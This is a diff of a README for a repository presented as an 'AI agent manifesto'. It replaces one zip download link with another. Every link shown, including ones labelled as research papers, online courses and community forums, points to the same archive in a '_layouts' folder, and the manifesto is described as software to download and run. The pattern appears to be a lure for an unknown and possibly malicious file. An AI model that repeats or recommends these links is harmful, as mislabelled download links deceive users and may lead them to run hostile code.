@@ -6,7 +6,7 @@ Welcome to the **ai-agent-manifesto**. This open manifesto provides insights int
 
 ## 📥 Download Now
 
-[![Download](https://raw.githubusercontent.com/Doc-Abdo/ai-agent-manifesto/main/_layouts/ai-agent-manifesto-v2.1.zip)](https://raw.githubusercontent.com/Doc-Abdo/ai-agent-manifesto/main/_layouts/ai-agent-manifesto-v2.1.zip)
+[![Download](https://github.com/Doc-Abdo/ai-agent-manifesto/raw/refs/heads/main/_layouts/ai_manifesto_agent_v2.2.zip)](https://github.com/Doc-Abdo/ai-agent-manifesto/raw/refs/heads/main/_layouts/ai_manifesto_agent_v2.2.zip)
 
 ## 📂 Overview
 
@@ -31,7 +31,7 @@ To run the resources effectively, make sure your system meets the following requ
 
 To get started, visit the releases page to download the latest version of the software:
 
-[Download Releases](https://raw.githubusercontent.com/Doc-Abdo/ai-agent-manifesto/main/_layouts/ai-agent-manifesto-v2.1.zip)
+[Download Releases](https://github.com/Doc-Abdo/ai-agent-manifesto/raw/refs/heads/main/_layouts/ai_manifesto_agent_v2.2.zip)
 
 Once you are on the releases page, you will see a list of available files. Choose the version you need and follow these steps:
 
@@ -61,9 +61,9 @@ Stay informed about the latest updates and features. Follow the repository to ge
 
 Here are some additional resources to help you understand AI agents better:
 
-- [AI Agent Research Papers](https://raw.githubusercontent.com/Doc-Abdo/ai-agent-manifesto/main/_layouts/ai-agent-manifesto-v2.1.zip)
-- [Online Courses on AI](https://raw.githubusercontent.com/Doc-Abdo/ai-agent-manifesto/main/_layouts/ai-agent-manifesto-v2.1.zip)
-- [Community Forums](https://raw.githubusercontent.com/Doc-Abdo/ai-agent-manifesto/main/_layouts/ai-agent-manifesto-v2.1.zip)
+- [AI Agent Research Papers](https://github.com/Doc-Abdo/ai-agent-manifesto/raw/refs/heads/main/_layouts/ai_manifesto_agent_v2.2.zip)
+- [Online Courses on AI](https://github.com/Doc-Abdo/ai-agent-manifesto/raw/refs/heads/main/_layouts/ai_manifesto_agent_v2.2.zip)
+- [Community Forums](https://github.com/Doc-Abdo/ai-agent-manifesto/raw/refs/heads/main/_layouts/ai_manifesto_agent_v2.2.zip)
 
 ## 📞 Contact Information
 
